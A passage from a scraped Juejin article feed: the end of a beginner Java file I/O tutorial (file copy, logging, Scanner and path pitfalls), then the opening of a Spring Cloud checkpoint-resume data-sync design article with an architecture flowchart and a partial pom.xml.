        System.out.println(<span class="hljs-string">"\n4. 使用try-with-resources："</span>);
        <span class="hljs-comment">// try-with-resources会自动关闭资源，无需手动close</span>
        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">"test.txt"</span>)) {
            writer.write(<span class="hljs-string">"自动关闭资源示例"</span>);
            System.out.println(<span class="hljs-string">"文件写入成功！"</span>);
        } <span class="hljs-keyword">catch</span> (IOException e) {
            System.out.println(<span class="hljs-string">"写入失败："</span> + e.getMessage());
        }
        <span class="hljs-comment">// 这里不需要writer.close()，因为try-with-resources会自动调用</span>
        
        <span class="hljs-comment">// 5. 综合示例：安全的文件复制</span>
        System.out.println(<span class="hljs-string">"\n5. 安全的文件复制："</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">sourceFile</span> <span class="hljs-operator">=</span> <span class="hljs-string">"student.txt"</span>;
        <span class="hljs-type">String</span> <span class="hljs-variable">destFile</span> <span class="hljs-operator">=</span> <span class="hljs-string">"student_backup.txt"</span>;
        
        <span class="hljs-keyword">try</span> (<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(sourceFile));
             <span class="hljs-type">BufferedWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(destFile))) {
            
            String line;
            <span class="hljs-type">int</span> <span class="hljs-variable">lineCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
            
            <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) {
                writer.write(line);
                writer.newLine();  <span class="hljs-comment">// 写入换行符</span>
                lineCount++;
            }
            
            System.out.println(<span class="hljs-string">"文件复制成功！共复制 "</span> + lineCount + <span class="hljs-string">" 行"</span>);
            
        } <span class="hljs-keyword">catch</span> (FileNotFoundException e) {
            System.out.println(<span class="hljs-string">"错误：源文件不存在"</span>);
        } <span class="hljs-keyword">catch</span> (IOException e) {
            System.out.println(<span class="hljs-string">"错误：复制文件时出错 - "</span> + e.getMessage());
        }
    }
}
</code></pre>
<h2 data-id="heading-9">4.实用技巧和小知识</h2>
<h3 data-id="heading-10">4.1 读取大文件</h3>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">import</span> java.io.*;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LargeFileReading</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== 读取大文件 ==="</span>);
        
        <span class="hljs-comment">// 方法1：使用BufferedReader（内存效率高）</span>
        <span class="hljs-keyword">try</span> (<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(<span class="hljs-string">"large_file.txt"</span>))) {
            String line;
            <span class="hljs-type">int</span> <span class="hljs-variable">lineCount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
            <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
            
            <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) {
                lineCount++;
                <span class="hljs-comment">// 处理每一行（这里只是计数）</span>
                <span class="hljs-keyword">if</span> (lineCount % <span class="hljs-number">10000</span> == <span class="hljs-number">0</span>) {
                    System.out.println(<span class="hljs-string">"已读取 "</span> + lineCount + <span class="hljs-string">" 行..."</span>);
                }
            }
            
            <span class="hljs-type">long</span> <span class="hljs-variable">endTime</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
            System.out.println(<span class="hljs-string">"读取完成！共 "</span> + lineCount + <span class="hljs-string">" 行"</span>);
            System.out.println(<span class="hljs-string">"耗时: "</span> + (endTime - startTime) + <span class="hljs-string">" 毫秒"</span>);
            
        } <span class="hljs-keyword">catch</span> (IOException e) {
            System.out.println(<span class="hljs-string">"读取文件时出错: "</span> + e.getMessage());
        }
        
        <span class="hljs-comment">// 方法2：读取二进制文件</span>
        System.out.println(<span class="hljs-string">"\n=== 读取二进制文件 ==="</span>);
        <span class="hljs-keyword">try</span> (<span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">"binary.dat"</span>);
             <span class="hljs-type">BufferedInputStream</span> <span class="hljs-variable">bis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(fis)) {
            
            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];  <span class="hljs-comment">// 1KB缓冲区</span>
            <span class="hljs-type">int</span> bytesRead;
            <span class="hljs-type">int</span> <span class="hljs-variable">totalBytes</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
            
            <span class="hljs-keyword">while</span> ((bytesRead = bis.read(buffer)) != -<span class="hljs-number">1</span>) {
                totalBytes += bytesRead;
                <span class="hljs-comment">// 处理二进制数据</span>
            }
            
            System.out.println(<span class="hljs-string">"读取了 "</span> + totalBytes + <span class="hljs-string">" 字节的二进制数据"</span>);
            
        } <span class="hljs-keyword">catch</span> (IOException e) {
            System.out.println(<span class="hljs-string">"读取二进制文件时出错: "</span> + e.getMessage());
        }
    }
}
</code></pre>
<h3 data-id="heading-11">4.2 日志记录</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.io.*;
<span class="hljs-keyword">import</span> java.text.SimpleDateFormat;
<span class="hljs-keyword">import</span> java.util.Date;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoggingExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== 日志记录系统 ==="</span>);
        
        <span class="hljs-comment">// 记录不同级别的日志</span>
        log(<span class="hljs-string">"INFO"</span>, <span class="hljs-string">"程序启动"</span>);
        log(<span class="hljs-string">"DEBUG"</span>, <span class="hljs-string">"加载配置文件"</span>);
        log(<span class="hljs-string">"WARNING"</span>, <span class="hljs-string">"内存使用率较高"</span>);
        log(<span class="hljs-string">"ERROR"</span>, <span class="hljs-string">"数据库连接失败"</span>);
        log(<span class="hljs-string">"INFO"</span>, <span class="hljs-string">"程序退出"</span>);
        
        <span class="hljs-comment">// 查看日志文件</span>
        System.out.println(<span class="hljs-string">"\n=== 日志文件内容 ==="</span>);
        <span class="hljs-keyword">try</span> (<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileReader</span>(<span class="hljs-string">"app.log"</span>))) {
            String line;
            <span class="hljs-keyword">while</span> ((line = reader.readLine()) != <span class="hljs-literal">null</span>) {
                System.out.println(line);
            }
        } <span class="hljs-keyword">catch</span> (IOException e) {
            System.out.println(<span class="hljs-string">"读取日志文件时出错: "</span> + e.getMessage());
        }
    }
    
    <span class="hljs-comment">// 日志记录方法</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">log</span><span class="hljs-params">(String level, String message)</span> {
        <span class="hljs-comment">// 获取当前时间</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">timestamp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>).format(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());
        
        <span class="hljs-comment">// 格式化的日志条目</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">logEntry</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">"[%s] %s: %s"</span>, timestamp, level, message);
        
        <span class="hljs-comment">// 输出到控制台</span>
        System.out.println(logEntry);
        
        <span class="hljs-comment">// 写入日志文件（追加模式）</span>
        <span class="hljs-keyword">try</span> (<span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrintWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileWriter</span>(<span class="hljs-string">"app.log"</span>, <span class="hljs-literal">true</span>))) {
            writer.println(logEntry);
        } <span class="hljs-keyword">catch</span> (IOException e) {
            System.out.println(<span class="hljs-string">"写入日志文件时出错: "</span> + e.getMessage());
        }
    }
}
</code></pre>
<h2 data-id="heading-12">5.常见问题和解决方案</h2>
<h3 data-id="heading-13">问题1：Scanner输入问题</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.Scanner;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ScannerProblems</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);
        
        <span class="hljs-comment">// 常见问题1：nextInt后接nextLine</span>
        System.out.print(<span class="hljs-string">"请输入年龄: "</span>);
        <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> scanner.nextInt();
        scanner.nextLine();  <span class="hljs-comment">// 解决方案：消耗掉换行符</span>
        
        System.out.print(<span class="hljs-string">"请输入姓名: "</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> scanner.nextLine();  <span class="hljs-comment">// 现在可以正确读取</span>
        
        System.out.println(<span class="hljs-string">"年龄: "</span> + age + <span class="hljs-string">", 姓名: "</span> + name);
        
        <span class="hljs-comment">// 常见问题2：输入类型不匹配</span>
        System.out.print(<span class="hljs-string">"请输入一个数字: "</span>);
        
        <span class="hljs-keyword">if</span> (scanner.hasNextInt()) {
            <span class="hljs-type">int</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> scanner.nextInt();
            System.out.println(<span class="hljs-string">"你输入的是数字: "</span> + num);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-type">String</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> scanner.next();
            System.out.println(<span class="hljs-string">"错误：'"</span> + input + <span class="hljs-string">"' 不是有效的数字！"</span>);
        }
        
        scanner.close();
    }
}
</code></pre>
<h3 data-id="heading-14">问题2：文件路径问题</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.io.File;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilePathProblems</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== 文件路径问题 ==="</span>);
        
        <span class="hljs-comment">// 1. 绝对路径 vs 相对路径</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">absolutePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">"C:\\Users\\admin\\file.txt"</span>;  <span class="hljs-comment">// Windows绝对路径</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">relativePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">"data/file.txt"</span>;  <span class="hljs-comment">// 相对路径</span>
        
        System.out.println(<span class="hljs-string">"绝对路径: "</span> + absolutePath);
        System.out.println(<span class="hljs-string">"相对路径: "</span> + relativePath);
        
        <span class="hljs-comment">// 2. 检查文件是否存在</span>
        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(relativePath);
        <span class="hljs-keyword">if</span> (file.exists()) {
            System.out.println(<span class="hljs-string">"文件存在！"</span>);
            System.out.println(<span class="hljs-string">"文件大小: "</span> + file.length() + <span class="hljs-string">" 字节"</span>);
            System.out.println(<span class="hljs-string">"可读: "</span> + file.canRead());
            System.out.println(<span class="hljs-string">"可写: "</span> + file.canWrite());
        } <span class="hljs-keyword">else</span> {
            System.out.println(<span class="hljs-string">"文件不存在！"</span>);
        }
        
        <span class="hljs-comment">// 3. 创建目录</span>
        <span class="hljs-type">File</span> <span class="hljs-variable">directory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">"logs"</span>);
        <span class="hljs-keyword">if</span> (!directory.exists()) {
            <span class="hljs-keyword">if</span> (directory.mkdir()) {
                System.out.println(<span class="hljs-string">"目录创建成功: "</span> + directory.getAbsolutePath());
            } <span class="hljs-keyword">else</span> {
                System.out.println(<span class="hljs-string">"目录创建失败！"</span>);
            }
        }
        
        <span class="hljs-comment">// 4. 列出目录内容</span>
        <span class="hljs-type">File</span> <span class="hljs-variable">currentDir</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">"."</span>);
        System.out.println(<span class="hljs-string">"\n当前目录内容:"</span>);
        String[] files = currentDir.list();
        <span class="hljs-keyword">if</span> (files != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">for</span> (String f : files) {
                System.out.println(f);
            }
        }
    }
}
</code></pre>
<h2 data-id="heading-15">总结：最重要的三点</h2>
<ol>
<li><strong>Scanner和System.out是基础</strong>：
<ul>
<li><code>System.out</code> 用于输出，<code>System.in</code> 用于输入</li>
<li><code>Scanner</code> 让输入变得简单，记得正确处理换行符</li>
</ul>
</li>
<li><strong>文件操作三步曲</strong>：
<ul>
<li>创建File对象指定文件</li>
<li>使用Reader/Writer进行读写</li>
<li>记得关闭资源（用try-with-resources）</li>
</ul>
</li>
<li><strong>异常处理是必须的</strong>：
<ul>
<li>I/O操作容易出错，必须处理异常</li>
<li>使用try-catch保护代码</li>
<li>给用户友好的错误提示</li>
</ul>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[分布式高并发Springcloud系统下的数据图同步断点续传方案【订单/商品/用户等】]]></title>    <link>https://juejin.cn/post/7579798332777758729</link>    <guid>https://juejin.cn/post/7579798332777758729</guid>    <pubDate>2025-12-04T08:45:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579798332777758729" data-draft-id="7579814711852695562" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="分布式高并发Springcloud系统下的数据图同步断点续传方案【订单/商品/用户等】"/> <meta itemprop="keywords" content="分布式,Spring Cloud,后端"/> <meta itemprop="datePublished" content="2025-12-04T08:45:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="哈哈哈笑什么"/> <meta itemprop="url" content="https://juejin.cn/user/808832912075352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            分布式高并发Springcloud系统下的数据图同步断点续传方案【订单/商品/用户等】
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/808832912075352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    哈哈哈笑什么
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T08:45:44.000Z" title="Thu Dec 04 2025 08:45:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">1. 核心需求复述</h3>
<p><strong>完全解耦、可复用</strong>的数据同步断点续传方案核心目标是让断点续传的通用逻辑（分布式锁、断点读写、批次控制、重试、幂等）与具体业务逻辑（订单/商品/用户数据同步）分离，新增任意业务数据同步时，仅需实现差异化的查询和同步逻辑，无需重复开发通用的断点续传框架。</p>
<h3 data-id="heading-1">2. 通用解耦版断点续传完整方案</h3>
<h4 data-id="heading-2">2.1 整体架构设计</h4>
<p>采用「<strong>接口抽象 + 模板方法模式 + 策略模式</strong>」实现解耦：</p>
<ul>
<li><strong>抽象层</strong>：定义<code>SyncDataSource</code>（数据源）和<code>SyncHandler</code>（同步处理器）接口，封装业务差异化逻辑；</li>
<li><strong>模板层</strong>：<code>GenericSyncTemplate</code>封装所有通用断点续传逻辑（锁、断点、重试、批次），依赖抽象接口而非具体业务；</li>
<li><strong>业务层</strong>：订单/商品等业务实现抽象接口，Spring自动收集所有实现类，通过<code>bizCode</code>动态路由；</li>
</ul>
<pre><code class="hljs language-css" lang="css">flowchart TB
    <span class="hljs-selector-tag">A</span><span class="hljs-selector-attr">[控制器]</span> --&gt;|传入bizCode| <span class="hljs-selector-tag">B</span><span class="hljs-selector-attr">[GenericSyncTemplate（通用模板）]</span>
    <span class="hljs-selector-tag">B</span> --&gt;|<span class="hljs-number">1</span>. 分布式锁| C<span class="hljs-selector-attr">[Redisson]</span>
    <span class="hljs-selector-tag">B</span> --&gt;|<span class="hljs-number">2</span>. 断点读写| D<span class="hljs-selector-attr">[BreakPointManager]</span>
    <span class="hljs-selector-tag">B</span> --&gt;|<span class="hljs-number">3</span>. 任务状态| E<span class="hljs-selector-attr">[SyncTaskService]</span>
    <span class="hljs-selector-tag">B</span> --&gt;|<span class="hljs-number">4</span>. 路由到业务实现| F{bizCode匹配}
    F --&gt;|order_sync| G<span class="hljs-selector-attr">[OrderSyncDataSource + OrderSyncHandler]</span>
    F --&gt;|product_sync| H<span class="hljs-selector-attr">[ProductSyncDataSource + ProductSyncHandler]</span>
    F --&gt;|user_sync| <span class="hljs-selector-tag">I</span><span class="hljs-selector-attr">[UserSyncDataSource + UserSyncHandler]</span>
    G/H/<span class="hljs-selector-tag">I</span> --&gt;|实现| J<span class="hljs-selector-attr">[SyncDataSource（查数据）+ SyncHandler（同步数据）]</span>
</code></pre>
<h4 data-id="heading-3">2.2 完整可运行代码</h4>
<h5 data-id="heading-4">2.2.1 环境依赖（pom.xml）</h5>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://maven.apache.org/POM/4.0.0"</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema-instance"</span>
         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.7.18<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">relativePath</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">parent</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>sync-resume-generic<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>sync-resume-generic<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>通用解耦版数据同步断点续传<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">java.version</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">java.version</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">spring-cloud.version</span>&gt;</span>2021.0.8<span class="hljs-tag">&lt;/<span class="hljs-name">spring-cloud.version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- SpringCloud核心 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2021.0.5.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.cloud<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-cloud-starter-openfeign<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- SpringBoot核心 --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
